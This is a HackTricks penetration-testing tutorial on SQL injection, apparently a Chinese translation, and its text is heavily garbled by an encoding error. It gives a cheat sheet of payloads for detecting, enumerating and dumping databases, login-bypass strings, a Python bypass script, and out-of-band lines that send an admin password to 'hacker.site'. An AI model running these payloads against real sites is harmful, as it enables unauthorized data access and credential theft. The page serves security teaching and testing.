# SQLæ³¨å…¥

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWSçº¢é˜Ÿä¸“å®¶ï¼‰</strong></a><strong>ï¼</strong></summary>

* æ‚¨åœ¨**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæƒ³è¦çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­å®£ä¼ **å—ï¼Ÿæˆ–è€…æƒ³è¦è®¿é—®**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½HackTricksçš„PDF**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[NFTsæ”¶è—å“](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ–åœ¨**Twitter**ä¸Šå…³æ³¨æˆ‘ ğŸ¦[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* **é€šè¿‡å‘[hacktricks repo](https://github.com/carlospolop/hacktricks)å’Œ[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§**ã€‚

</details>

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

â€‹â€‹â€‹â€‹[**RootedCON**](https://www.rootedcon.com/)æ˜¯è¥¿ç­ç‰™æœ€é‡è¦çš„ç½‘ç»œå®‰å…¨æ´»åŠ¨ä¹‹ä¸€ï¼Œä¹Ÿæ˜¯æ¬§æ´²æœ€é‡è¦çš„ä¹‹ä¸€ã€‚ä½œä¸ºä¿ƒè¿›æŠ€æœ¯çŸ¥è¯†çš„ä½¿å‘½ï¼Œè¿™ä¸ªå¤§ä¼šæ˜¯æŠ€æœ¯å’Œç½‘ç»œå®‰å…¨ä¸“ä¸šäººå£«åœ¨å„ä¸ªé¢†åŸŸçš„çƒ­ç‚¹äº¤æµåœ°ã€‚

{% embed url="https://www.rootedcon.com/" %}

## ä»€ä¹ˆæ˜¯SQLæ³¨å…¥ï¼Ÿ

**SQLæ³¨å…¥**æ˜¯ä¸€ç§å®‰å…¨æ¼æ´ï¼Œå…è®¸æ”»å‡»è€…å¹²æ‰°åº”ç”¨ç¨‹åºçš„æ•°æ®åº“æŸ¥è¯¢ã€‚è¿™ç§æ¼æ´å¯ä»¥ä½¿æ”»å‡»è€…**æŸ¥çœ‹**ã€**ä¿®æ”¹**æˆ–**åˆ é™¤**ä»–ä»¬ä¸åº”è®¿é—®çš„æ•°æ®ï¼ŒåŒ…æ‹¬å…¶ä»–ç”¨æˆ·çš„ä¿¡æ¯æˆ–åº”ç”¨ç¨‹åºå¯ä»¥è®¿é—®çš„ä»»ä½•æ•°æ®ã€‚è¿™äº›è¡Œä¸ºå¯èƒ½å¯¼è‡´å¯¹åº”ç”¨ç¨‹åºåŠŸèƒ½æˆ–å†…å®¹çš„æ°¸ä¹…æ›´æ”¹ï¼Œç”šè‡³å±åŠæœåŠ¡å™¨æˆ–é€ æˆæ‹’ç»æœåŠ¡ã€‚

## å…¥å£ç‚¹æ£€æµ‹

å½“ç½‘ç«™ç”±äºå¯¹SQLæ³¨å…¥ï¼ˆSQLiï¼‰ç›¸å…³è¾“å…¥çš„å¼‚å¸¸æœåŠ¡å™¨å“åº”è€Œ**æ˜“å—æ”»å‡»**æ—¶ï¼Œ**ç¬¬ä¸€æ­¥**æ˜¯äº†è§£å¦‚ä½•**åœ¨ä¸ä¸­æ–­æŸ¥è¯¢çš„æƒ…å†µä¸‹æ³¨å…¥æ•°æ®**ã€‚è¿™éœ€è¦æœ‰æ•ˆåœ°è¯†åˆ«**ä»å½“å‰ä¸Šä¸‹æ–‡ä¸­é€ƒé€¸**çš„æ–¹æ³•ã€‚
ä»¥ä¸‹æ˜¯ä¸€äº›æœ‰ç”¨çš„ç¤ºä¾‹ï¼š
```
[Nothing]
'
"
`
')
")
`)
'))
"))
`))
```
ç„¶åï¼Œæ‚¨éœ€è¦çŸ¥é“å¦‚ä½•**ä¿®å¤æŸ¥è¯¢ä»¥é¿å…é”™è¯¯**ã€‚ä¸ºäº†ä¿®å¤æŸ¥è¯¢ï¼Œæ‚¨å¯ä»¥**è¾“å…¥**æ•°æ®ï¼Œä½¿**å…ˆå‰çš„æŸ¥è¯¢æ¥å—æ–°æ•°æ®**ï¼Œæˆ–è€…æ‚¨å¯ä»¥åªæ˜¯**è¾“å…¥**æ‚¨çš„æ•°æ®å¹¶**åœ¨æœ«å°¾æ·»åŠ æ³¨é‡Šç¬¦å·**ã€‚

_è¯·æ³¨æ„ï¼Œå¦‚æœæ‚¨å¯ä»¥çœ‹åˆ°é”™è¯¯æ¶ˆæ¯æˆ–è€…å¯ä»¥å‘ç°æŸ¥è¯¢åœ¨å·¥ä½œæ—¶å’Œä¸å·¥ä½œæ—¶çš„å·®å¼‚ï¼Œè¿™ä¸ªé˜¶æ®µå°†ä¼šæ›´å®¹æ˜“ã€‚_

### **æ³¨é‡Š**
```sql
MySQL
#comment
-- comment     [Note the space after the double dash]
/*comment*/
/*! MYSQL Special SQL */

PostgreSQL
--comment
/*comment*/

MSQL
--comment
/*comment*/

Oracle
--comment

SQLite
--comment
/*comment*/

HQL
HQL does not support comments
```
### ä½¿ç”¨é€»è¾‘æ“ä½œç¡®è®¤

ç¡®è®¤ SQL æ³¨å…¥æ¼æ´çš„å¯é æ–¹æ³•åŒ…æ‹¬æ‰§è¡Œ**é€»è¾‘æ“ä½œ**å¹¶è§‚å¯Ÿé¢„æœŸç»“æœã€‚ä¾‹å¦‚ï¼Œå½“ä¿®æ”¹ GET å‚æ•°ï¼Œå¦‚ `?username=Peter` åˆ° `?username=Peter' or '1'='1` æ—¶äº§ç”Ÿç›¸åŒå†…å®¹ï¼Œè¡¨æ˜å­˜åœ¨ SQL æ³¨å…¥æ¼æ´ã€‚

åŒæ ·ï¼Œåº”ç”¨**æ•°å­¦æ“ä½œ**ä½œä¸ºæœ‰æ•ˆçš„ç¡®è®¤æŠ€æœ¯ã€‚ä¾‹å¦‚ï¼Œå¦‚æœè®¿é—® `?id=1` å’Œ `?id=2-1` äº§ç”Ÿç›¸åŒç»“æœï¼Œåˆ™è¡¨æ˜å­˜åœ¨ SQL æ³¨å…¥ã€‚

æ¼”ç¤ºé€»è¾‘æ“ä½œç¡®è®¤çš„ç¤ºä¾‹ï¼š
```
page.asp?id=1 or 1=1 -- results in true
page.asp?id=1' or 1=1 -- results in true
page.asp?id=1" or 1=1 -- results in true
page.asp?id=1 and 1=2 -- results in false
```
è¿™ä¸ªå•è¯åˆ—è¡¨æ˜¯ä¸ºäº†å°è¯•ä»¥æè®®çš„æ–¹å¼**ç¡®è®¤SQLæ³¨å…¥**è€Œåˆ›å»ºçš„ï¼š

{% file src="../../.gitbook/assets/sqli-logic.txt" %}

### ä½¿ç”¨æ—¶é—´ç¡®è®¤

åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œæ‚¨**ä¸ä¼šæ³¨æ„åˆ°é¡µé¢**ä¸Šçš„ä»»ä½•å˜åŒ–ã€‚å› æ­¤ï¼Œå‘ç°ç›²ç›®SQLæ³¨å…¥çš„ä¸€ä¸ªå¥½æ–¹æ³•æ˜¯è®©æ•°æ®åº“æ‰§è¡Œæ“ä½œï¼Œè¿™å°†**å½±å“é¡µé¢åŠ è½½æ‰€éœ€çš„æ—¶é—´**ã€‚\
å› æ­¤ï¼Œæˆ‘ä»¬å°†åœ¨SQLæŸ¥è¯¢ä¸­è¿æ¥ä¸€ä¸ªéœ€è¦å¾ˆé•¿æ—¶é—´æ‰èƒ½å®Œæˆçš„æ“ä½œï¼š
```
MySQL (string concat and logical ops)
1' + sleep(10)
1' and sleep(10)
1' && sleep(10)
1' | sleep(10)

PostgreSQL (only support string concat)
1' || pg_sleep(10)

MSQL
1' WAITFOR DELAY '0:0:10'

Oracle
1' AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])
1' AND 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',10)

SQLite
1' AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
1' AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
```
åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œ**sleep å‡½æ•°å¯èƒ½ä¸è¢«å…è®¸**ã€‚å› æ­¤ï¼Œæ‚¨å¯ä»¥ä½¿æŸ¥è¯¢**æ‰§è¡Œå¤æ‚æ“ä½œ**ï¼Œä»¥ä¾¿éœ€è¦å‡ ç§’é’Ÿçš„æ—¶é—´ã€‚_è¿™äº›æŠ€æœ¯çš„ç¤ºä¾‹å°†åœ¨æ¯ç§æŠ€æœ¯ä¸­å•ç‹¬è¿›è¡Œè¯´æ˜_ã€‚

### è¯†åˆ«åç«¯

è¯†åˆ«åç«¯çš„æœ€ä½³æ–¹æ³•æ˜¯å°è¯•æ‰§è¡Œä¸åŒåç«¯çš„å‡½æ•°ã€‚æ‚¨å¯ä»¥ä½¿ç”¨ä¸Šä¸€èŠ‚ä¸­çš„**sleep å‡½æ•°**æˆ–è¿™äº›å‡½æ•°ï¼ˆæ¥è‡ª[payloadsallthethings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#dbms-identification)ä¸­çš„è¡¨æ ¼ï¼š
```bash
["conv('a',16,2)=conv('a',16,2)"                   ,"MYSQL"],
["connection_id()=connection_id()"                 ,"MYSQL"],
["crc32('MySQL')=crc32('MySQL')"                   ,"MYSQL"],
["BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)"       ,"MSSQL"],
["@@CONNECTIONS>0"                                 ,"MSSQL"],
["@@CONNECTIONS=@@CONNECTIONS"                     ,"MSSQL"],
["@@CPU_BUSY=@@CPU_BUSY"                           ,"MSSQL"],
["USER_ID(1)=USER_ID(1)"                           ,"MSSQL"],
["ROWNUM=ROWNUM"                                   ,"ORACLE"],
["RAWTOHEX('AB')=RAWTOHEX('AB')"                   ,"ORACLE"],
["LNNVL(0=123)"                                    ,"ORACLE"],
["5::int=5"                                        ,"POSTGRESQL"],
["5::integer=5"                                    ,"POSTGRESQL"],
["pg_client_encoding()=pg_client_encoding()"       ,"POSTGRESQL"],
["get_current_ts_config()=get_current_ts_config()" ,"POSTGRESQL"],
["quote_literal(42.5)=quote_literal(42.5)"         ,"POSTGRESQL"],
["current_database()=current_database()"           ,"POSTGRESQL"],
["sqlite_version()=sqlite_version()"               ,"SQLITE"],
["last_insert_rowid()>1"                           ,"SQLITE"],
["last_insert_rowid()=last_insert_rowid()"         ,"SQLITE"],
["val(cvar(1))=1"                                  ,"MSACCESS"],
["IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0"               ,"MSACCESS"],
["cdbl(1)=cdbl(1)"                                 ,"MSACCESS"],
["1337=1337",   "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
["'i'='i'",     "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
```
æ­¤å¤–ï¼Œå¦‚æœæ‚¨å¯ä»¥è®¿é—®æŸ¥è¯¢çš„è¾“å‡ºï¼Œæ‚¨å¯ä»¥ä½¿å…¶**æ‰“å°æ•°æ®åº“çš„ç‰ˆæœ¬**ã€‚

{% hint style="info" %}
æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å°†è®¨è®ºåˆ©ç”¨ä¸åŒç±»å‹çš„SQLæ³¨å…¥çš„ä¸åŒæ–¹æ³•ã€‚æˆ‘ä»¬å°†ä»¥MySQLä¸ºä¾‹ã€‚
{% endhint %}

### ä½¿ç”¨PortSwiggerè¿›è¡Œè¯†åˆ«

{% embed url="https://portswigger.net/web-security/sql-injection/cheat-sheet" %}

## åˆ©ç”¨è”åˆæŸ¥è¯¢

### æ£€æµ‹åˆ—æ•°

å¦‚æœæ‚¨å¯ä»¥çœ‹åˆ°æŸ¥è¯¢çš„è¾“å‡ºï¼Œè¿™æ˜¯åˆ©ç”¨å®ƒçš„æœ€ä½³æ–¹æ³•ã€‚\
é¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦æ‰¾å‡º**åˆå§‹è¯·æ±‚**è¿”å›çš„**åˆ—æ•°**ã€‚è¿™æ˜¯å› ä¸º**ä¸¤ä¸ªæŸ¥è¯¢å¿…é¡»è¿”å›ç›¸åŒæ•°é‡çš„åˆ—**ã€‚\
é€šå¸¸æœ‰ä¸¤ç§æ–¹æ³•ç”¨äºæ­¤ç›®çš„ï¼š

#### Order/Group by

ä¸ºäº†ç¡®å®šæŸ¥è¯¢ä¸­çš„åˆ—æ•°ï¼Œé€æ¸è°ƒæ•´åœ¨**ORDER BY**æˆ–**GROUP BY**å­å¥ä¸­ä½¿ç”¨çš„æ•°å­—ï¼Œç›´åˆ°æ”¶åˆ°é”™è¯¯å“åº”ã€‚å°½ç®¡**GROUP BY**å’Œ**ORDER BY**åœ¨SQLä¸­å…·æœ‰ä¸åŒçš„åŠŸèƒ½ï¼Œä½†ä¸¤è€…éƒ½å¯ä»¥ç”¨äºç¡®å®šæŸ¥è¯¢çš„åˆ—æ•°ã€‚
```sql
1' ORDER BY 1--+    #True
1' ORDER BY 2--+    #True
1' ORDER BY 3--+    #True
1' ORDER BY 4--+    #False - Query is only using 3 columns
#-1' UNION SELECT 1,2,3--+    True
```

```sql
1' GROUP BY 1--+    #True
1' GROUP BY 2--+    #True
1' GROUP BY 3--+    #True
1' GROUP BY 4--+    #False - Query is only using 3 columns
#-1' UNION SELECT 1,2,3--+    True
```
#### UNION SELECT

é€‰æ‹©æ›´å¤šçš„ç©ºå€¼ï¼Œç›´åˆ°æŸ¥è¯¢æ­£ç¡®ä¸ºæ­¢ï¼š
```sql
1' UNION SELECT null-- - Not working
1' UNION SELECT null,null-- - Not working
1' UNION SELECT null,null,null-- - Worked
```
_åœ¨æŸäº›æƒ…å†µä¸‹ï¼ŒæŸ¥è¯¢ä¸¤ä¾§åˆ—çš„ç±»å‹å¿…é¡»ç›¸åŒï¼Œå› æ­¤åº”ä½¿ç”¨`null`å€¼ã€‚_

### æå–æ•°æ®åº“åç§°ã€è¡¨åç§°å’Œåˆ—åç§°

åœ¨ä¸‹é¢çš„ç¤ºä¾‹ä¸­ï¼Œæˆ‘ä»¬å°†æ£€ç´¢æ‰€æœ‰æ•°æ®åº“çš„åç§°ã€æ•°æ®åº“çš„è¡¨åç§°ä»¥åŠè¡¨çš„åˆ—åç§°ï¼š
```sql
#Database names
-1' UniOn Select 1,2,gRoUp_cOncaT(0x7c,schema_name,0x7c) fRoM information_schema.schemata

#Tables of a database
-1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,table_name,0x7C) fRoM information_schema.tables wHeRe table_schema=[database]

#Column names
-1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,column_name,0x7C) fRoM information_schema.columns wHeRe table_name=[table name]
```
_åœ¨æ¯ä¸ªä¸åŒçš„æ•°æ®åº“ä¸Šå‘ç°è¿™äº›æ•°æ®çš„æ–¹æ³•éƒ½ä¸åŒï¼Œä½†æ–¹æ³•è®ºæ€»æ˜¯ç›¸åŒçš„ã€‚_

## åˆ©ç”¨éšè—çš„åŸºäºè”åˆçš„æ³¨å…¥

å½“æŸ¥è¯¢çš„è¾“å‡ºå¯è§ï¼Œä½†åŸºäºè”åˆçš„æ³¨å…¥ä¼¼ä¹æ— æ³•å®ç°æ—¶ï¼Œè¿™è¡¨æ˜å­˜åœ¨**éšè—çš„åŸºäºè”åˆçš„æ³¨å…¥**ã€‚è¿™ç§æƒ…å†µé€šå¸¸ä¼šå¯¼è‡´ç›²æ³¨å…¥çš„æƒ…å†µã€‚è¦å°†ç›²æ³¨å…¥è½¬å˜ä¸ºåŸºäºè”åˆçš„æ³¨å…¥ï¼Œéœ€è¦è¯†åˆ«åç«¯æ‰§è¡ŒæŸ¥è¯¢ã€‚

è¿™å¯ä»¥é€šè¿‡ä½¿ç”¨ç›²æ³¨å…¥æŠ€æœ¯ä»¥åŠç‰¹å®šäºç›®æ ‡æ•°æ®åº“ç®¡ç†ç³»ç»Ÿï¼ˆDBMSï¼‰çš„é»˜è®¤è¡¨æ¥å®ç°ã€‚ä¸ºäº†äº†è§£è¿™äº›é»˜è®¤è¡¨ï¼Œå»ºè®®æŸ¥é˜…ç›®æ ‡DBMSçš„æ–‡æ¡£ã€‚

ä¸€æ—¦æŸ¥è¯¢è¢«æå–å‡ºæ¥ï¼Œå°±éœ€è¦è°ƒæ•´æœ‰æ•ˆè½½è·ä»¥å®‰å…¨åœ°å…³é—­åŸå§‹æŸ¥è¯¢ã€‚éšåï¼Œåœ¨æœ‰æ•ˆè½½è·ä¸­é™„åŠ ä¸€ä¸ªè”åˆæŸ¥è¯¢ï¼Œä»è€Œä¿ƒè¿›å¯¹æ–°è·å¾—çš„åŸºäºè”åˆçš„æ³¨å…¥çš„åˆ©ç”¨ã€‚

è¦è·å–æ›´å…¨é¢çš„è§è§£ï¼Œè¯·å‚è€ƒ[Healing Blind Injections](https://medium.com/@Rend_/healing-blind-injections-df30b9e0e06f)ä¸Šæä¾›çš„å®Œæ•´æ–‡ç« ã€‚

## åˆ©ç”¨åŸºäºé”™è¯¯çš„æ³¨å…¥

å¦‚æœç”±äºæŸç§åŸå› æ‚¨**æ— æ³•**çœ‹åˆ°**æŸ¥è¯¢**çš„**è¾“å‡º**ï¼Œä½†å¯ä»¥**çœ‹åˆ°é”™è¯¯æ¶ˆæ¯**ï¼Œåˆ™å¯ä»¥åˆ©ç”¨è¿™äº›é”™è¯¯æ¶ˆæ¯ä»æ•°æ®åº“ä¸­**æå–**æ•°æ®ã€‚\
æŒ‰ç…§ä¸åŸºäºè”åˆçš„åˆ©ç”¨ç›¸ä¼¼çš„æµç¨‹ï¼Œæ‚¨å¯ä»¥æˆåŠŸåœ°è½¬å‚¨æ•°æ®åº“ã€‚
```sql
(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))
```
## åˆ©ç”¨ç›²æ³¨å…¥æ”»å‡»

åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ‚¨æ— æ³•çœ‹åˆ°æŸ¥è¯¢ç»“æœæˆ–é”™è¯¯ï¼Œä½†æ‚¨å¯ä»¥åŒºåˆ†æŸ¥è¯¢è¿”å›çš„æ˜¯çœŸè¿˜æ˜¯å‡çš„å“åº”ï¼Œå› ä¸ºé¡µé¢ä¸Šçš„å†…å®¹ä¸åŒã€‚\
åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ‚¨å¯ä»¥åˆ©ç”¨è¿™ç§è¡Œä¸ºé€ä¸ªå­—ç¬¦åœ°è½¬å‚¨æ•°æ®åº“ï¼š
```sql
?id=1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables = 'A'
```
## åˆ©ç”¨é”™è¯¯ç›²æ³¨ SQLi

è¿™ä¸ä¹‹å‰çš„æƒ…å†µ**ç›¸åŒ**ï¼Œä½†ä¸å†åŒºåˆ†æŸ¥è¯¢çš„çœŸ/å‡å“åº”ï¼Œè€Œæ˜¯å¯ä»¥åŒºåˆ†SQLæŸ¥è¯¢ä¸­æ˜¯å¦å­˜åœ¨**é”™è¯¯**ï¼ˆä¹Ÿè®¸æ˜¯å› ä¸ºHTTPæœåŠ¡å™¨å´©æºƒï¼‰ã€‚å› æ­¤ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ¯æ¬¡çŒœå¯¹ä¸€ä¸ªå­—ç¬¦æ—¶ï¼Œæ‚¨éƒ½å¯ä»¥å¼ºåˆ¶å¼•å‘ä¸€ä¸ª SQL é”™è¯¯ï¼š
```sql
AND (SELECT IF(1,(SELECT table_name FROM information_schema.tables),'a'))-- -
```
## åˆ©ç”¨åŸºäºæ—¶é—´çš„ SQLi

åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œ**æ— æ³•**æ ¹æ®é¡µé¢çš„ä¸Šä¸‹æ–‡**åŒºåˆ†**æŸ¥è¯¢çš„å“åº”ã€‚ä½†æ˜¯ï¼Œå¦‚æœçŒœæµ‹çš„å­—ç¬¦æ­£ç¡®ï¼Œå¯ä»¥ä½¿é¡µé¢**åŠ è½½æ—¶é—´æ›´é•¿**ã€‚æˆ‘ä»¬ä¹‹å‰å·²ç»çœ‹åˆ°è¿‡è¿™ç§æŠ€æœ¯çš„åº”ç”¨ï¼Œç”¨äº[ç¡®è®¤ SQLi æ¼æ´](./#confirming-with-timing)ã€‚
```sql
1 and (select sleep(10) from users where SUBSTR(table_name,1,1) = 'A')#
```
## å †å æŸ¥è¯¢

æ‚¨å¯ä»¥ä½¿ç”¨å †å æŸ¥è¯¢æ¥**è¿ç»­æ‰§è¡Œå¤šä¸ªæŸ¥è¯¢**ã€‚è¯·æ³¨æ„ï¼Œå°½ç®¡åç»­æŸ¥è¯¢è¢«æ‰§è¡Œï¼Œ**ç»“æœ**å¹¶**ä¸ä¼šè¿”å›ç»™åº”ç”¨ç¨‹åº**ã€‚å› æ­¤ï¼Œè¿™ç§æŠ€æœ¯ä¸»è¦ç”¨äºä¸**ç›²æ³¨æ¼æ´**ç›¸å…³çš„æƒ…å†µï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ç¬¬äºŒä¸ªæŸ¥è¯¢æ¥è§¦å‘DNSæŸ¥æ‰¾ã€æ¡ä»¶é”™è¯¯æˆ–æ—¶é—´å»¶è¿Ÿã€‚

**Oracle**ä¸æ”¯æŒ**å †å æŸ¥è¯¢**ã€‚**MySQLã€Microsoft**å’Œ**PostgreSQL**æ”¯æŒï¼š`åœ¨æ­¤å¤„æ”¾ç½®ç¬¬ä¸€ä¸ªæŸ¥è¯¢; åœ¨æ­¤å¤„æ”¾ç½®ç¬¬äºŒä¸ªæŸ¥è¯¢`

## å¸¦å¤–åˆ©ç”¨

å¦‚æœ**æ²¡æœ‰å…¶ä»–**åˆ©ç”¨æ–¹æ³•**å¥æ•ˆ**ï¼Œæ‚¨å¯ä»¥å°è¯•è®©æ•°æ®åº“å°†ä¿¡æ¯**ä¼ è¾“**åˆ°æ‚¨æ§åˆ¶çš„**å¤–éƒ¨ä¸»æœº**ã€‚ä¾‹å¦‚ï¼Œé€šè¿‡DNSæŸ¥è¯¢ï¼š
```sql
select load_file(concat('\\\\',version(),'.hacker.site\\a.txt'));
```
### é€šè¿‡XXEè¿›è¡Œå¸¦å¤–æ•°æ®æ³„éœ²
```sql
a' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.hacker.site/"> %remote;]>'),'/l') FROM dual-- -
```
## è‡ªåŠ¨åŒ–åˆ©ç”¨

æŸ¥çœ‹[SQLMap Cheetsheat](sqlmap/)ä»¥ä½¿ç”¨[**sqlmap**](https://github.com/sqlmapproject/sqlmap)åˆ©ç”¨SQLiæ¼æ´ã€‚

## æŠ€æœ¯ç‰¹å®šä¿¡æ¯

æˆ‘ä»¬å·²ç»è®¨è®ºäº†åˆ©ç”¨SQLæ³¨å…¥æ¼æ´çš„æ‰€æœ‰æ–¹æ³•ã€‚åœ¨æœ¬ä¹¦ä¸­æ‰¾åˆ°ä¸€äº›ä¸æ•°æ®åº“æŠ€æœ¯ç›¸å…³çš„æ›´å¤šæŠ€å·§ï¼š

* [MS Access](ms-access-sql-injection.md)
* [MSSQL](mssql-injection.md)
* [MySQL](mysql-injection/)
* [Oracle](oracle-injection.md)
* [PostgreSQL](postgresql-injection/)

æˆ–è€…æ‚¨å¯ä»¥åœ¨[**https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection**](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)ä¸­æ‰¾åˆ°å…³äºMySQLã€PostgreSQLã€Oracleã€MSSQLã€SQLiteå’ŒHQLçš„**è®¸å¤šæŠ€å·§**ã€‚

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

â€‹â€‹â€‹â€‹â€‹[**RootedCON**](https://www.rootedcon.com/)æ˜¯**è¥¿ç­ç‰™**æœ€é‡è¦çš„ç½‘ç»œå®‰å…¨æ´»åŠ¨ä¹‹ä¸€ï¼Œä¹Ÿæ˜¯**æ¬§æ´²**æœ€é‡è¦çš„æ´»åŠ¨ä¹‹ä¸€ã€‚ä½œä¸ºä¿ƒè¿›æŠ€æœ¯çŸ¥è¯†çš„ä½¿å‘½ï¼Œè¿™ä¸ªå¤§ä¼šæ˜¯æŠ€æœ¯å’Œç½‘ç»œå®‰å…¨ä¸“ä¸šäººå£«åœ¨å„ä¸ªé¢†åŸŸçš„çƒ­ç‚¹äº¤æµå¹³å°ã€‚

{% embed url="https://www.rootedcon.com/" %}

## èº«ä»½éªŒè¯ç»•è¿‡

å°è¯•ç»•è¿‡ç™»å½•åŠŸèƒ½çš„åˆ—è¡¨ï¼š

{% content-ref url="../login-bypass/sql-login-bypass.md" %}
[sql-login-bypass.md](../login-bypass/sql-login-bypass.md)
{% endcontent-ref %}

### åŸå§‹å“ˆå¸Œèº«ä»½éªŒè¯ç»•è¿‡
```sql
"SELECT * FROM admin WHERE pass = '".md5($password,true)."'"
```
è¿™ä¸ªæŸ¥è¯¢å±•ç¤ºäº†åœ¨ä½¿ç”¨MD5è¿›è¡ŒåŸå§‹è¾“å‡ºéªŒè¯æ—¶çš„ä¸€ä¸ªæ¼æ´ï¼Œä½¿ç³»ç»Ÿå®¹æ˜“å—åˆ°SQLæ³¨å…¥æ”»å‡»ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ è¾“å…¥ï¼Œä½¿å…¶åœ¨å“ˆå¸Œåäº§ç”Ÿæ„å¤–çš„SQLå‘½ä»¤éƒ¨åˆ†ï¼Œä»è€Œå®ç°æœªç»æˆæƒçš„è®¿é—®ã€‚
```sql
md5("ffifdyop", true) = 'or'6ï¿½]ï¿½ï¿½!r,ï¿½ï¿½bï¿½
sha1("3fDf ", true) = Qï¿½u'='ï¿½@ï¿½[ï¿½tï¿½- oï¿½ï¿½_-!
```
### æ³¨å…¥å“ˆå¸Œèº«ä»½éªŒè¯ç»•è¿‡
```sql
admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'
```
**æ¨èåˆ—è¡¨**ï¼š

æ‚¨åº”è¯¥å°†åˆ—è¡¨ä¸­çš„æ¯ä¸€è¡Œä½œä¸ºç”¨æˆ·åï¼Œå¯†ç å§‹ç»ˆä¸ºï¼š_**Pass1234.**_\
ï¼ˆè¿™äº›æœ‰æ•ˆè½½è·ä¹ŸåŒ…å«åœ¨æœ¬èŠ‚å¼€å¤´æåˆ°çš„å¤§åˆ—è¡¨ä¸­ï¼‰

{% file src="../../.gitbook/assets/sqli-hashbypass.txt" %}

### GBKèº«ä»½éªŒè¯ç»•è¿‡

å¦‚æœ ' è¢«è½¬ä¹‰ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ %A8%27ï¼Œå½“ ' è¢«è½¬ä¹‰æ—¶ï¼Œå°†åˆ›å»ºï¼š0xA80x5c0x27 (_â•˜'_)
```sql
%A8%27 OR 1=1;-- 2
%8C%A8%27 OR 1=1-- 2
%bf' or 1=1 -- --
```
Pythonè„šæœ¬ï¼š
```python
import requests
url = "http://example.com/index.php"
cookies = dict(PHPSESSID='4j37giooed20ibi12f3dqjfbkp3')
datas = {"login": chr(0xbf) + chr(0x27) + "OR 1=1 #", "password":"test"}
r = requests.post(url, data = datas, cookies=cookies, headers={'referrer':url})
print r.text
```
### å¤šè¯­è¨€æ³¨å…¥ï¼ˆå¤šä¸Šä¸‹æ–‡ï¼‰
```sql
SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
```
## æ’å…¥è¯­å¥

### ä¿®æ”¹ç°æœ‰å¯¹è±¡/ç”¨æˆ·çš„å¯†ç 

è¦åšåˆ°è¿™ä¸€ç‚¹ï¼Œæ‚¨åº”è¯¥å°è¯•**åˆ›å»ºä¸€ä¸ªåä¸º"ä¸»å¯¹è±¡"**ï¼ˆåœ¨ç”¨æˆ·æƒ…å†µä¸‹å¯èƒ½æ˜¯**admin**ï¼‰ä¿®æ”¹ä¸€äº›å†…å®¹ï¼š

